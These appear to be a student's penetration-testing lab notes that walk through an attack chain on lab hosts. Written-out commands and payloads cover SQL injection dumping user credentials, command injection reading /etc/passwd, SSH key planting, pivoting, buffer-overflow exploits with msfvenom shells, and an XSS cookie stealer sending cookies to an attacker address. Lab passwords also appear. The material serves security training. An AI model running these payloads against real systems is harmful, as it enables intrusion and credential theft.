Penetration Testing Lab Notes
Initial Access & Setup
Jump Box Connection
Bashssh demo1@10.50.14.253 -L 1111:10.208.50.61:80

Password: (redacted)
Access web interface: firefox http://127.0.0.1:1111/classinfo

Target Information

Network: 10.208.50.200/24
Stack Number: 4
Username: JADU-019-M
Password: gXliXVXVuULy

Do NOT use your jump box today
Primary Target: 10.50.16.50 (Public Facing Website)
Open Ports on 10.50.16.50: 22, 53, 80

Phase 1: Reconnaissance & Enumeration (Port 80)
Nmap Scans
Bashnmap -Pn -T5 -sT -p 80 --script http-enum.nse 10.50.16.50
nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse 10.50.16.50
nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse 10.50.16.50
Findings

/login.html — Possible admin folder
SQL Injection vulnerability in username field on /login.html
' OR 1='1 works in both username and password fields
Captured POST request via Browser Dev Tools → Network tab → Raw payload

Command Injection via Decode String Prompt
Bash; cat /etc/passwd
; whoami          → www-data
; ls -la /var/www
Key discovery: www-data home directory = /var/www

Phase 2: Web Exploitation - SSH Key Upload
On Linops (Attacker)
Bashssh-keygen -t rsa -b 4096   # No passphrase
cat ~/.ssh/id_rsa.pub
On Target (via Command Injection)
Bash; mkdir -p /var/www/.ssh
; echo "ssh-rsa AAAAB3Nz... (your public key)" >> /var/www/.ssh/authorized_keys
; cat /var/www/.ssh/authorized_keys
SSH as www-data
Bashssh www-data@10.50.16.50
Post Access Checks:
Baship addr                     # 10.10.28.20/27
sudo -l                     # www-data can run /var/tmp/exploit_me as sudo
bash                        # Drop to proper shell

Phase 3: Pivoting & Internal Network Enumeration
Dynamic SOCKS Proxy
Bashssh www-data@10.50.16.50 -D 9050 2>/dev/null
proxychains nmap -Pn -T4 192.168.28.175
Local Port Forwarding
Bashssh www-data@10.50.16.50 -L 10601:192.168.28.175:8000
firefox http://127.0.0.1:10601
Ping Sweeps (from compromised hosts)
Bash# From www-data
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null; done

# From user3@RoundSensor
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null; done
Next Targets Discovered

192.168.28.165 → Ports 22, 8888
192.168.28.189 → Ports 22, 135, 139, 445, 3389, 9999


Phase 4: SQL Injection (GET Method)
Vulnerable Parameter: ?product=
Enumeration Steps
SQL?product=7 OR 1=1
?product=7 UNION SELECT 1,2,@@version
?product=7 UNION SELECT table_schema,table_name,column_name 
           FROM information_schema.columns
Golden Statement:
SQL?product=7 UNION SELECT table_schema,table_name,column_name 
           FROM information_schema.columns
Successful Query:
SQL?product=7 UNION SELECT user_id,name,username 
           FROM siteusers.users
Credentials (after ROT13 decoding):

Aaron : appleBottomJ3an$
user2 : TurkeyDay24
user3 : Bob4THEPin3apples ← Working account
Lee_Roth : Lroth / anotherpassword4THEages


Phase 5: Linux Buffer Overflow (on Target System)
Must be performed on the target machine
Steps Summary

gdb exploit_me
Generate pattern (wiremask.eu) → length 100
Find EIP offset
Create exploit.py:Pythonoffset = "A" * 55
eip = "BBBB"
nop = "\x90" * 32
buf = b""   # msfvenom payload
print(offset + eip + nop + buf)
env - gdb exploit_me
unset env LINES
unset env COLUMNS
Find jmp esp:Bashfind /b <heap_end>, <stack_start>, 0xff, 0xe4
Use msfvenom:Bashmsfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00' -f python
Final exploit:Bashsudo ./exploit_me $(python exploit.py)

Success: Drops to root shell (#)

SSH Tunneling & Master Socket Techniques
Create Master Socket
Bashssh -MS /tmp/jump demo1@10.50.12.21
Dynamic SOCKS Proxy
Bashssh -S /tmp/jump jump -O forward -D 9050
proxychains nmap ...
Local Port Forward
Bashssh -S /tmp/jump jump -O forward -L 1111:10.50.12.21:80
Cancel Forward
Bashssh -S /tmp/jump jump -O cancel -L 1111:10.50.12.21:80

Web Exploitation Techniques

Command Injection:; whoami / ; cat /etc/passwd
Directory Traversal:../../../../../../etc/passwd
SQL Injection (see dedicated section)
XSS Cookie Stealer:HTML<script>document.location="http://YOUR_IP:PORT/?c=" + document.cookie;</script>
File Upload + Execution


SQL Injection Summary
Blind / Union-based

' OR 1='1 → Find vulnerable field
UNION SELECT 1,2,3,... → Determine column count
Golden Statement:SQLUNION SELECT 1,2,table_schema,table_name,column_name 
FROM information_schema.columns
Dump data:SQLUNION SELECT 1,2,username,password FROM users

GET Method Example:
text?product=7 UNION SELECT 1,2,@@version

Linux Host Enumeration (Privilege Escalation)
Bashwhoami && id && groups && sudo -l
cat /etc/passwd
cat /etc/hosts
uname -a && cat /etc/*release*
ip addr
ss -antp
ps -ef
find / -perm -4000 -ls 2>/dev/null   # SUID
find / -perm -6000 -ls 2>/dev/null   # SUID + SGID
SUID/SGID + GTFObins

Buffer Overflow Workflow (Linux)

Static Analysis (file, strings)
Behavioral Analysis (./func)
Fuzzing
Offset discovery (wiremask.eu)
Find jmp esp in gdb (env - gdb)
Generate payload with msfvenom
Craft final exploit script


Windows Buffer Overflow (TRUN /.:/)
Key Steps:

Fuzz with increasing "A"s
Find offset (~2003)
Find JMP ESP in essfunc.dll (!mona jmp -r esp)
NOP sled + msfvenom reverse shell
Listener: multi/handler


Post-Exploitation
Linux:

cat /etc/passwd, sudo -l, find SUID
Check cron jobs, logs, SSH keys

Windows:'

net user, tasklist /svc, ipconfig /all
Check Scheduled Tasks, Services, Run keys


Tip: Always use ls -la, check /tmp, /var/www, home directories.
Pro Tip: Master sockets + proxychains = clean pivoting.
